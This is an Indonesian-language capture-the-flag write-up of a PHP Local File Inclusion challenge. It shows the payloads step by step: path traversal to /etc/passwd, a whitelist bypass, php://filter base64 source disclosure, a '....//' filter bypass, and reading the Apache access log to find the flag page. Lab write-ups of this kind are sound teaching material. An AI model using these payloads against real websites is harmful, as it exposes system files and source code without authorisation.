- Mengakses website yang diberikan, lalu dengan jelas diberikan fitur untuk melihat foto binatang dengan php include.

- Karena sudah jelas bahwa bisa dieksploitasi menggunakan Local File Inclusion, maka langsung saja kita masukan payload basic:
  ```
  ../../../../../../etc/passwd
  ```
- User akan mendapatkan pesan "Sorry, only dog, fox, and cat are allowed.". Karena kita hanya boleh melihat foto binatang-binatang tersebut saja.
- User mem-bypass proteksi tersebut dengan memasukkan payload:
  ```
  Contoh: 
  dog/../../../etc/passwd
  ```
- User menyadari pesan error:
  ```
  Warning: include(dog/etc/passwd.php): failed to open stream: No such file or directory in C:\xampp\htdocs\index.php on line 166
  ```
- Karena sudah tahu bahwa extensionnya akan selalu berakhiran .php, maka User akan mencoba menggunakan PHP Filter dengan payload:
  ```
  php://filter/convert.base64-encode/resource=dog/../index
  ```
- User menyadari kembali jika string "../" akan dihilangkan. Maka dengan mudah User akan mem-bypassnya menggunakan payload:
  ```
  php://filter/convert.base64-encode/resource=dog/....//index
  ```
- User mendapatkan source-code index.php tetapi dengan representasi base64. User mendecodenya (jika perlu) untuk mencari hint selanjutnya. Hint selanjutnya berada pada file dog.php, maka User menggunakan payload tadi untuk mendapatkan source codenya.
  ```
  Payload:
  php://filter/convert.base64-encode/resource=dog
  
  Hasil:
  <?php  
  $flag = "Nice, the flag is behind that LOG";
  ?>
  <img width="460" height="460" class="center" src="dogs/<?php echo rand(1, 5); ?>.png" />
  ```
- User melihat hint tersebut dan tahu bahwa User harus mengakses log. User mengakses apache log dengan menggunakan payload:
  ```
  dog/....//....//....//....//....//....//....//....//....//....//....//....//var/log/apache2/access.log
  ```
- User melihat bahwa "bot" mengakses halaman "ini_flagnya_beneran_ga_bohongxixixi.html".
- User mengkases halaman tersebut pada website dan mendapatkan flagnya!
